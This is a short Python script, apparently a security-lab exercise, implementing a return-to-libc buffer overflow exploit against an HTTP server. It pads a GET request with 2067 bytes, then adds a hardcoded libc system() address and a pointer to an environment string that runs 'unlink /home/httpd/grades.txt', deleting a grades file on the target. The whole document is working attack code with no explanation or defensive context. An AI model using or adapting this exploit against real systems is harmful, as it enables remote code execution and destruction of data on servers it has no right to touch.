#Return to libc exploit that uses system function call to unlink /home/httpd/grades.txt file

import sys, socket, struct, urllib

# Use in the form "python httppattern.py host port"

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

shellfile = open("shellcode.bin", "r")
shellcode = shellfile.read()

system = struct.pack('<L', 0xb7e6b100)Â #$1 = {<text variable, no debug info>} 0xb7e6b100 <__libc_system>
env = struct.pack('<L', 0xbffff8c5) #"RM=unlink /home/httpd/grades.txt"

pattern = "A" * 2067 + urllib.quote(system) + "HACK" + env 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address

command = "GET /" + pattern + "/home/httpd/grades.txt" + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n"
client.send(command) # Send the command
data = client.recv(1024) # Recieve Reply
client.close() # Close the Connection
